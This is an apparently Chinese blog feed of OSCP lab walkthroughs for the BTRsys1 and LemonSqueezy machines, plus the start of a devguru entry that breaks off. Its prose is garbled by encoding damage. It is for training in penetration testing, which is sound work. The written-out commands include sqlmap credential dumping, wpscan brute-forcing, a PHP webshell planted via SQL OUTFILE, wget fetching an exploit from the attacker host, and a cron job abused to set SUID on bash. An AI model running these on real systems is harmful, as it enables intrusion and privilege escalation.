        <content type="html"><![CDATA[<h1 id="OSCPç³»åˆ—é¶æœºâ€”BTRsys1"><a href="#OSCPç³»åˆ—é¶æœºâ€”BTRsys1" class="headerlink" title="OSCPç³»åˆ—é¶æœºâ€”BTRsys1"></a>OSCPç³»åˆ—é¶æœºâ€”BTRsys1</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-BTRsys1/image-20240722153014361.png" alt="image-20240722153014361"></p><h2 id="äºŒã€ç«¯å£æ¢æµ‹"><a href="#äºŒã€ç«¯å£æ¢æµ‹" class="headerlink" title="äºŒã€ç«¯å£æ¢æµ‹"></a>äºŒã€ç«¯å£æ¢æµ‹</h2><p>1ã€å¿«é€Ÿæ‰«æ</p><p><img src="/img/OSCP-BTRsys1/image-20240722153056004.png" alt="image-20240722153056004"></p><p>2ã€å…¨ç«¯å£æ‰«æ</p><p><img src="/img/OSCP-BTRsys1/image-20240722153129282.png" alt="image-20240722153129282"></p><p>å…±å¼€æ”¾ä¸‰ä¸ªç«¯å£</p><p>3ã€æ¼æ´æ¢æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p 21,22,80 192.168.31.72</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ç»™å‡ºäº†ç«¯å£å¯¹åº”çš„æœåŠ¡ä¿¡æ¯ï¼Œå°±ä¸å†è¿›è¡ŒæœåŠ¡ç‰ˆæœ¬æ¢æµ‹äº†</p><p><img src="/img/OSCP-BTRsys1/image-20240722153235844.png" alt="image-20240722153235844"></p><p>ftp å­˜åœ¨ä»»æ„ç”¨æˆ·ç™»é™†ï¼Œå…¶ä»–ç«¯å£æ²¡å•¥ä¿¡æ¯</p><p><img src="/img/OSCP-BTRsys1/image-20240722153311271.png" alt="image-20240722153311271"></p><h2 id="ä¸‰ã€FTPä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€FTPä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€FTPä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€FTPä¿¡æ¯æ”¶é›†</h2><p><img src="/img/OSCP-BTRsys1/image-20240722153520227.png" alt="image-20240722153520227"></p><p>å•¥ä¹Ÿæ²¡æœ‰ï¼Œä¸åº”è¯¥å•Šï¼›å°è¯•æ–‡ä»¶ä¸Šä¼ </p><p><img src="/img/OSCP-BTRsys1/image-20240722153652206.png" alt="image-20240722153652206"></p><p>æƒé™è¢«æ‹’ç»ï¼Œæ— æ³•ä¸Šä¼ </p><h2 id="å››ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#å››ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="å››ã€HTTPä¿¡æ¯æ”¶é›†"></a>å››ã€HTTPä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€é¦–é¡µåŠæºä»£ç "><a href="#1ã€é¦–é¡µåŠæºä»£ç " class="headerlink" title="1ã€é¦–é¡µåŠæºä»£ç "></a>1ã€é¦–é¡µåŠæºä»£ç </h3><p><img src="/img/OSCP-BTRsys1/image-20240722153815998.png" alt="image-20240722153815998"></p><p>ä»–è¿™é‡Œè¿˜ä¸€ç›´åœ¨è½¬åœˆåœˆï¼ŒåŠ è½½æ…¢äº†å¾ˆï¼Œä¼°è®¡æ˜¯åç«¯æœ‰ä¸€ç›´åœ¨æ‰§è¡Œçš„æ“ä½œï¼›çœ‹æºä»£ç </p><p><img src="/img/OSCP-BTRsys1/image-20240722154006002.png" alt="image-20240722154006002"></p><p>å™¢ï¼Œæˆ‘è¯´æ€ä¹ˆåŠ è½½è¿™ä¹ˆæ…¢ï¼ŒåŸæ¥æ˜¯cssã€jsç­‰è¯·æ±‚äº†å¤–éƒ¨é“¾æ¥ï¼›çºµè§‚è¿™ä¸ªæºä»£ç ï¼Œåªæœ‰aæ ‡ç­¾çš„<code>hakkimizda.php</code>é“¾æ¥æ˜¯æˆ‘ä»¬æ„Ÿå…´è¶£çš„</p><h3 id="2ã€hakkimizda-php-æ–‡ä»¶"><a href="#2ã€hakkimizda-php-æ–‡ä»¶" class="headerlink" title="2ã€hakkimizda.php æ–‡ä»¶"></a>2ã€hakkimizda.php æ–‡ä»¶</h3><p><img src="/img/OSCP-BTRsys1/image-20240722154331817.png" alt="image-20240722154331817"></p><p>è¿™é‡Œç–‘ä¼¼æœ‰æ–‡ä»¶åŒ…å«çš„å«Œç–‘ï¼Œå®ƒçš„å¤´éƒ¨è·Ÿé¦–é¡µæ˜¯ä¸€æ ·çš„ï¼›æŠŠè¿™æ®µè¯æ‹¿ç»™AIè§£æä¸‹</p><p><img src="/img/OSCP-BTRsys1/image-20240722154607262.png" alt="image-20240722154607262"></p><p>æ˜¯ä¸€æ®µåœŸè€³å…¶è¯­è¨€è¯´çš„ä¸€æ®µè¯ï¼Œåé¢çš„æ¸—é€æµ‹è¯•æ­¥éª¤è¿™é‡Œä¼¼ä¹ç»™äº†æç¤ºï¼Œä¸çŸ¥é“æ˜¯å¦ä¸æ­¤é¶åœºæœ‰å…³</p><p><img src="/img/OSCP-BTRsys1/image-20240722154735567.png" alt="image-20240722154735567"></p><h3 id="3ã€åšç›®å½•æ‰«æ"><a href="#3ã€åšç›®å½•æ‰«æ" class="headerlink" title="3ã€åšç›®å½•æ‰«æ"></a>3ã€åšç›®å½•æ‰«æ</h3><p>åˆ°è¿™é‡ŒåŸºæœ¬ä¸Šæ²¡çº¿ç´¢äº†ï¼Œåšä¸€éç›®å½•æ‰«æ</p><p><img src="/img/OSCP-BTRsys1/image-20240722155256963.png" alt="image-20240722155256963"></p><p>å€’æ˜¯å‘ç°å‡ ä¸ªæœ‰è¶£çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼›æŒ‘æœ‰ä»·å€¼çš„è®²ä¸€ä¸‹</p><h3 id="4ã€login-php-æ–‡ä»¶"><a href="#4ã€login-php-æ–‡ä»¶" class="headerlink" title="4ã€login.php æ–‡ä»¶"></a>4ã€login.php æ–‡ä»¶</h3><p><img src="/img/OSCP-BTRsys1/image-20240722155731439.png" alt="image-20240722155731439"></p><p>æœ¬æƒ³å°è¯•ä¸‹å¼±å£ä»¤ï¼Œä½†æ˜¯å‘ç°è¿™ä¸ªåœ°æ–¹æ²¡æœ‰èµ°åç«¯ï¼›æ ¡éªŒæ˜¯åœ¨å‰ç«¯ä¸­</p><p><img src="/img/OSCP-BTRsys1/image-20240722160028558.png" alt="image-20240722160028558"></p><p>çœ‹æºä»£ç ï¼›åŸæ¥æ˜¯åœ¨å‰ç«¯å…ˆæ ¡éªŒäº†ä¸‹ç”¨æˆ·åä¸­<code>@</code>åé¢æ˜¯ä¸æ˜¯<code>btrisk.com</code>ï¼Œç¬¦åˆè¦æ±‚æ‰å‘åç«¯æäº¤</p><p><img src="/img/OSCP-BTRsys1/image-20240722160157681.png" alt="image-20240722160157681"></p><p>æˆ‘ä»¬éšä¾¿ç”¨ä¸€ä¸ªè´¦å·å¦‚ <code>123@btrisk.com</code> ä»»æ„å¯†ç ï¼Œæ¥åˆ°äº†åç«¯çš„<code>personel.php</code>æ–‡ä»¶</p><p><img src="/img/OSCP-BTRsys1/image-20240722160643305.png" alt="image-20240722160643305"></p><p>è¿™é‡Œæœ‰ä¸ªæŠ¥é”™ï¼Œè¯´ç¼ºå°‘å‚æ•°ï¼›ä¸‹é¢æ²¡æœ‰æ˜¾ç¤ºå…·ä½“çš„å­—æ®µä¿¡æ¯ï¼›åº”è¯¥æ˜¯ç”¨æˆ·åç¬¦åˆè¦æ±‚æ‰€ä»¥è¿›æ¥è¿™ä¸ªé¡µé¢ï¼Œä½†æ˜¯å› ä¸ºå¯†ç ä¸æ­£ç¡®æ‰€ä»¥æ²¡æœ‰æ·»åŠ ä¸Šå¿…è¦çš„å‚æ•°ï¼›æ—¢ç„¶å¦‚æ­¤ï¼Œç”¨sqlmap è·‘ä¸€ä¸‹çœ‹æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥æ¼æ´</p><h3 id="5ã€SQLæ³¨å…¥æ¼æ´"><a href="#5ã€SQLæ³¨å…¥æ¼æ´" class="headerlink" title="5ã€SQLæ³¨å…¥æ¼æ´"></a>5ã€SQLæ³¨å…¥æ¼æ´</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.31.72/personel.php --data &quot;kullanici_adi=admin@btrisk.com&amp;parola=123456&quot; --batch</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys1/image-20240722161550783.png" alt="image-20240722161550783"></p><p>OKï¼Œç»“æœä¹Ÿæ˜¯éå¸¸æ˜æ˜¾ï¼Œå­˜åœ¨SQLæ³¨å…¥ï¼Œé‚£æŸ¥çœ‹ç”¨æˆ·çš„ä¿¡æ¯</p><p>å½“æˆ‘ä»¬æŸ¥åˆ°å­—æ®µçš„æ—¶å€™ï¼Œå‘ç°æœ‰è¿™ä¹ˆäº›å­—æ®µï¼Œçœ‹å“ªä¸ªå­—æ®µå‘¢ï¼Ÿ</p><p><img src="/img/OSCP-BTRsys1/image-20240722161752570.png" alt="image-20240722161752570"></p><p>åœ¨ç™»å½•æ¡†ä¸­å·²ç»ç»™å‡ºäº†ç­”æ¡ˆ</p><p><img src="/img/OSCP-BTRsys1/image-20240722161726319.png" alt="image-20240722161726319"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.31.72/personel.php --data &quot;kullanici_adi=admin@btrisk.com&amp;parola=123456&quot; --batch -D &quot;deneme&quot; -T &quot;user&quot; -C &quot;Kullanici_Adi,Parola&quot; --dump</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys1/image-20240722161902674.png" alt="image-20240722161902674"></p><p>ä¿©ç”¨æˆ·ï¼Œå¯†ç éƒ½ä¸€æ ·çš„æ˜‚</p><h3 id="6ã€ç™»é™†åå°"><a href="#6ã€ç™»é™†åå°" class="headerlink" title="6ã€ç™»é™†åå°"></a>6ã€ç™»é™†åå°</h3><p>ç™»é™†ä¹‹åï¼Œåå°æœç„¶å˜äº†ï¼Œæœ‰æ–‡ä»¶ä¸Šä¼ </p><p><img src="/img/OSCP-BTRsys1/image-20240722162028206.png" alt="image-20240722162028206"></p><h2 id="äº”ã€Getshell"><a href="#äº”ã€Getshell" class="headerlink" title="äº”ã€Getshell"></a>äº”ã€Getshell</h2><p>æœ¬æƒ³ä¸Šä¼ ä¸€ä¸ªtxtæ–‡ä»¶è¯•è¯•æ°´ï¼Œä½†ç»™æˆ‘æ‹¦æˆªäº†ï¼Œè¯´åªèƒ½<code>jpg,png</code>æ ¼å¼</p><p><img src="/img/OSCP-BTRsys1/image-20240722162204112.png" alt="image-20240722162204112"></p><p>æˆ‘æŠŠtxt åç¼€æ”¹æˆjpgï¼Œç»§ç»­ä¸Šä¼ </p><p><img src="/img/OSCP-BTRsys1/image-20240722162332979.png" alt="image-20240722162332979"></p><p>ä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯æ²¡ç»™è·¯å¾„ï¼›æ¬¸ï¼Œè¿™ä¸ªæ—¶å€™æƒ³èµ·æ¥åšç›®å½•æ‰«æä¸­å‘ç°çš„<code>/uploads/</code>ç›®å½•äº†ï¼Œå»çœ‹ä¸‹</p><p><img src="/img/OSCP-BTRsys1/image-20240722162420803.png" alt="image-20240722162420803"></p><p>æœç„¶åœ¨è¿™é‡Œï¼›é‚£ä¸Šä¼ php åå¼¹shell æ–‡ä»¶ï¼›æ³¨æ„æ”¹æˆè‡ªå·±çš„IPå’Œç«¯å£</p><p><img src="/img/OSCP-BTRsys1/image-20240722162536677.png" alt="image-20240722162536677"></p><p>ä¸Šä¼ ç”¨bp æŠ“åŒ…æ”¹åç¼€</p><p><img src="/img/OSCP-BTRsys1/image-20240722162724345.png" alt="image-20240722162724345"></p><p>è®¿é—®webshellï¼Œå¹¶ç”¨nc è¿›è¡Œç›‘å¬ï¼ŒæˆåŠŸgetshell</p><p><img src="/img/OSCP-BTRsys1/image-20240722162851050.png" alt="image-20240722162851050"></p><h2 id="å…­ã€æƒé™æå‡"><a href="#å…­ã€æƒé™æå‡" class="headerlink" title="å…­ã€æƒé™æå‡"></a>å…­ã€æƒé™æå‡</h2><h3 id="1ã€ä¿¡æ¯æ”¶é›†"><a href="#1ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€ä¿¡æ¯æ”¶é›†"></a>1ã€ä¿¡æ¯æ”¶é›†</h3><p><img src="/img/OSCP-BTRsys1/image-20240722163226329.png" alt="image-20240722163226329"></p><p>å‘ç°æ•°æ®åº“çš„è´¦å·ç ï¼Œè€Œä¸”è¿˜æ˜¯root é«˜æƒé™ç”¨æˆ·</p><p><img src="/img/OSCP-BTRsys1/image-20240722163957837.png" alt="image-20240722163957837"></p><p>ä½†æ˜¯è¿è¡Œmysql çš„ç”¨æˆ·æ˜¯<code>mysql</code>ï¼Œä¾ç„¶æ˜¯ä½æƒé™ç”¨æˆ·ï¼Œæ— æ³•é€šè¿‡æ•°æ®åº“è¿›è¡Œææƒï¼›ä½†æ˜¯çœ‹åˆ°è¿™ä¸ªlinux çš„å†…æ ¸ç‰ˆæœ¬è¾ƒä½ï¼Œæ˜¯å¦å¯ä»¥ä½¿ç”¨è„ç‰›ææƒå‘¢ï¼Ÿ</p><h3 id="2ã€è„ç‰›ææƒè‡³root"><a href="#2ã€è„ç‰›ææƒè‡³root" class="headerlink" title="2ã€è„ç‰›ææƒè‡³root"></a>2ã€è„ç‰›ææƒè‡³root</h3><p>æŸ¥è¯¢æœ‰å…³è¯¥å†…æ ¸ç‰ˆæœ¬ææƒçš„è„šæœ¬</p><p><img src="/img/OSCP-BTRsys1/image-20240722164254080.png" alt="image-20240722164254080"></p><p>æœ‰ä¿©ï¼Œæ„Ÿè§‰èƒ½æˆåŠŸï¼Œå°è¯•ç¬¬ä¸€ä¸ª</p><p><img src="/img/OSCP-BTRsys1/image-20240722164507055.png" alt="image-20240722164507055"></p><p>è„šæœ¬ä¸Šå†™äº†é£Ÿç”¨æ–¹æ³•ï¼Œç…§ç€æ¥å°±è¡Œï¼Œå°†è„šæœ¬ä¸Šä¼ è‡³é¶æœºåç¼–è¯‘è¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// æ”»å‡»æœº</span><br><span class="line">python3 -m http.server</span><br><span class="line">// é¶æœº</span><br><span class="line">cd /tmp;wget http://192.168.31.58:8000/37292.c</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys1/image-20240722165100748.png" alt="image-20240722165100748"></p><p>æ¬¸ï¼Œæ²¡æœ‰gcc æ–‡ä»¶ï¼Œé‚£ç”¨cc ï¼›æŠŠè¿™é‡Œçš„gcc æ”¹æˆ ccï¼›ä¹‹åé‡æ–°æ¥ä¸€é</p><p><img src="/img/OSCP-BTRsys1/image-20240722172104166.png" alt="image-20240722172104166"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//ccæ‰§è¡Œ</span><br><span class="line">cc 37292.c -o ofs</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys1/image-20240722172408177.png" alt="image-20240722172408177"></p><p>ææƒæˆåŠŸ</p><p><img src="/img/OSCP-BTRsys1/image-20240722172430686.png" alt="image-20240722172430686"></p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœº-LemonSqueezy</title>
      <link href="/2024/07/22/OSCP-LemonSqueezy/"/>
      <url>/2024/07/22/OSCP-LemonSqueezy/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€OSCPç³»åˆ—ã€‘OSCPé¶æœº-LemonSqueezy"><a href="#ã€OSCPç³»åˆ—ã€‘OSCPé¶æœº-LemonSqueezy" class="headerlink" title="ã€OSCPç³»åˆ—ã€‘OSCPé¶æœº-LemonSqueezy"></a>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœº-LemonSqueezy</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-LemonSqueezy/image-20240721193710744.png" alt="image-20240721193710744"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><p>1ã€å¿«é€Ÿæ‰«æ</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721193803205.png" alt="image-20240721193803205"></p><p>2ã€å…¨ç«¯å£æ‰«æ</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721193853109.png" alt="image-20240721193853109"></p><p>åªæœ‰ä¸€ä¸ª80ç«¯å£</p><p>3ã€ç‰ˆæœ¬ç³»ç»Ÿæ¢æµ‹</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721194004016.png" alt="image-20240721194004016"></p><p>80ç«¯å£httpçš„apacheæœåŠ¡ï¼Œç³»ç»Ÿç–‘ä¼¼linux 3æˆ–linux 4ç‰ˆæœ¬ï¼Œå¯èƒ½å­˜åœ¨è„ç‰›æå–æ¼æ´</p><p>4ã€æ¼æ´æ¢æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p 80 192.168.31.71</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721194310067.png" alt="image-20240721194310067"></p><p>æ‰¾åˆ°ä¸€äº›å¯èƒ½çš„csrf æ¼æ´</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721194334838.png" alt="image-20240721194334838"></p><p>è¿˜åšäº†ä¸€äº›ç›®å½•æ‰«æï¼Œè¿™é‡Œæœ‰å¾ˆå¤šæ„Ÿå…´è¶£çš„ç›®å½•</p><h2 id="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†</h2><p>å¯¹æ ¹ç›®å½•å…ˆåšä¸€ä¸ªæ‰«æ</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721194909005.png" alt="image-20240721194909005"></p><h3 id="1ã€wordpressä¿¡æ¯æ”¶é›†"><a href="#1ã€wordpressä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€wordpressä¿¡æ¯æ”¶é›†"></a>1ã€wordpressä¿¡æ¯æ”¶é›†</h3><p>1ã€wpscan å·¥å…·æ‰¾ç”¨æˆ·å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.71/wordpress/ --enumerate u</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721195901728.png" alt="image-20240721195901728"></p><p>2ã€ç”¨ <code>cewl</code>ç”Ÿæˆå¯†ç </p><p><img src="/img/OSCP-LemonSqueezy/image-20240721200047471.png" alt="image-20240721200047471"></p><p>3ã€å°è¯•wpscan çˆ†ç ´å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.71/wordpress/ -P pass.txt --usernames user.txt</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721200324539.png" alt="image-20240721200324539"></p><p>çˆ†ç ´å¤±è´¥ï¼›å°è¯•ä½¿ç”¨å¤§å­—å…¸è¿›è¡Œçˆ†ç ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.71/wordpress/ -P /usr/share/wordlists/rockyou.txt --usernames user.txt</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721212623527.png" alt="image-20240721212623527"></p><p>è¿™é‡Œä¸€ç›´åœ¨è·‘ï¼Œéœ€è¦ç­‰å¾…äº†</p><p>4ã€æºç æŸ¥çœ‹</p><p>ç›®å½•æ‰«æä¸­ï¼Œæœ‰ä¸€ä¸ªtar.gz æ–‡ä»¶ï¼Œä¸‹è½½å¹¶è§£å‹</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721201601529.png" alt="image-20240721201601529"></p><p>æ²¡æœ‰<code>wp-config.php</code>æ–‡ä»¶ï¼Œä½†æ˜¯æœ‰ä¸ª<code>wp-config-sample.php</code>æ–‡ä»¶ï¼Œæœ¬æƒ³ç€èƒ½æ‰¾åˆ°è´¦å·å¯†ç ï¼Œä½†æ˜¯ç»“æœæ˜¯è¿™æ ·çš„</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721212437529.png" alt="image-20240721212437529"></p><p>5ã€ç™»é™†wordpress åå°</p><p>æˆ‘ä»¬å¯¹ç”¨æˆ·åè¿›è¡Œåˆ†å¼€çˆ†ç ´ï¼Œç¬¬äºŒä¸ªç”¨æˆ·å¾ˆå¿«çˆ†ç ´å‡ºæ¥å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.71/wordpress/ -P /usr/share/wordlists/rockyou.txt --usernames &quot;orange&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721213301924.png" alt="image-20240721213301924"></p><p>è¿›å…¥åå°ï¼Œæœ‰ä¸€ç¯‡<code>orange</code>æœ¬äººå‘è¡¨çš„æ–‡ç« ï¼›ä¸”åå­—å¯ç–‘</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721213659327.png" alt="image-20240721213659327"></p><p><img src="/img/OSCP-LemonSqueezy/image-20240721213723346.png" alt="image-20240721213723346"></p><p><img src="/img/OSCP-LemonSqueezy/image-20240721213749683.png" alt="image-20240721213749683"></p><p>å™¢ï¼Œä¿æŒè¿™ä¸ªå®‰å…¨ï¼Œè¿™ä¸ªæ€•æ˜¯æŸä¸ªå¯†ç </p><p>æœ¬æ¥è¿˜æƒ³ssh å°è¯•çˆ†ç ´ï¼Œä½†æ˜¯çªç„¶æƒ³åˆ°è¿™ä¸ªé¶åœºåªæœ‰80ç«¯å£</p><h3 id="2ã€phpmyadminä¿¡æ¯æ”¶é›†"><a href="#2ã€phpmyadminä¿¡æ¯æ”¶é›†" class="headerlink" title="2ã€phpmyadminä¿¡æ¯æ”¶é›†"></a>2ã€phpmyadminä¿¡æ¯æ”¶é›†</h3><p>åˆ©ç”¨ä¸Šé¢çš„è´¦å·å¯†ç åœ¨phpmyadminè¿›è¡Œç™»é™†ï¼Œç™»é™†æˆåŠŸ</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721214432676.png" alt="image-20240721214432676"></p><p>å°è¯•æ—¥å¿—getshell</p><p>ä½†æ˜¯æƒ³åˆ°ä¸æ˜¯rootç”¨æˆ·ï¼Œä¼¼ä¹æ²¡æœ‰æƒé™</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721214748196.png" alt="image-20240721214748196"></p><h2 id="å››ã€Getshell"><a href="#å››ã€Getshell" class="headerlink" title="å››ã€Getshell"></a>å››ã€Getshell</h2><p>å°è¯•åœ¨phpmyadminåå°å†™å…¥webshellæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php system($_GET[&#x27;shell&#x27;]); ?&gt;&quot; into outfile &quot;/var/www/html/wordpress/shell.php&quot; </span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721214852097.png" alt="image-20240721214852097"></p><p>æ‰§è¡ŒæˆåŠŸï¼›å°è¯•æ‰§è¡Œå‘½ä»¤ï¼›æ‰§è¡ŒæˆåŠŸ</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721215036637.png" alt="image-20240721215036637"></p><p>åå¼¹shell</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721220243106.png" alt="image-20240721220243106"></p><h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><p>1ã€ä¿¡æ¯æ”¶é›†</p><p>è¿›æ¥ä¹‹åçœ‹åˆ°äº†å¤‡ä»½æ–‡ä»¶ä¸­æ²¡æœ‰çš„<code>wp-config.php</code>æ–‡ä»¶</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721220413052.png" alt="image-20240721220413052"></p><p>é‡æ–°çœ‹åˆ°äº†æ•°æ®åº“çš„è´¦å·å¯†ç </p><p><img src="/img/OSCP-LemonSqueezy/image-20240721220543049.png" alt="image-20240721220543049"></p><p>2ã€è®¡åˆ’ä»»åŠ¡</p><p>æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡å‘ç°æœ€åæœ‰ä¸€ä¸ªå¯ç–‘çš„ç‚¹</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721221511558.png" alt="image-20240721221511558"></p><p>å±…ç„¶æ˜¯ä¸€ä¸ª777 çš„å¯å†™å¯æ‰§è¡Œæ–‡ä»¶</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721221623748.png" alt="image-20240721221623748"></p><p>å†™å…¥ä¸€ä¸ªåé—¨ï¼Œå¦‚<code>/bin/bash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;chmod +s /bin/bash&#x27; &gt; /etc/logrotate.d/logrotate</span><br></pre></td></tr></table></figure><p>ä¹‹åç­‰å¾…<code>/bin/bash</code>å˜æˆsuid æ–‡ä»¶</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721223650413.png" alt="image-20240721223650413"></p><p>3ã€ææƒè‡³root</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721223739692.png" alt="image-20240721223739692"></p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”devguru</title>
      <link href="/2024/07/20/OSCP-devguru/"/>
      <url>/2024/07/20/OSCP-devguru/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”devguru"><a href="#ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”devguru" class="headerlink" title="ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”devguru"></a>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”devguru</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-devguru/image-20240718222512239.png" alt="image-20240718222512239"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><p>1ã€å¿«é€Ÿæ‰«æ</p><p><img src="/img/OSCP-devguru/image-20240718222557792.png" alt="image-20240718222557792"></p><p>2ã€å…¨ç«¯å£æ‰«æ</p><p><img src="/img/OSCP-devguru/image-20240718222625989.png" alt="image-20240718222625989"></p><p>3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹</p><p><img src="/img/OSCP-devguru/image-20240718222853251.png" alt="image-20240718222853251"></p><p>4ã€æ¼æ´æ¢æµ‹</p><p><img src="/img/OSCP-devguru/image-20240718223139900.png" alt="image-20240718223139900"></p><p>å‘ç°gitæ³„éœ²ï¼Œè¿˜æœ‰äº›è®¸ç›®å½•æ‰«æ</p><p><img src="/img/OSCP-devguru/image-20240718223204843.png" alt="image-20240718223204843"></p><h2 id="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†</h2><p>1ã€é¦–é¡µ</p><p><img src="/img/OSCP-devguru/image-20240718223301889.png" alt="image-20240718223301889"></p><p>2ã€è¿›è¡Œç›®å½•æ‰«æ</p><p><img src="/img/OSCP-devguru/image-20240718223545789.png" alt="image-20240718223545789"></p><p>3ã€gitä¿¡æ¯æ”¶é›†</p><p><img src="/img/OSCP-devguru/image-20240718223713078.png" 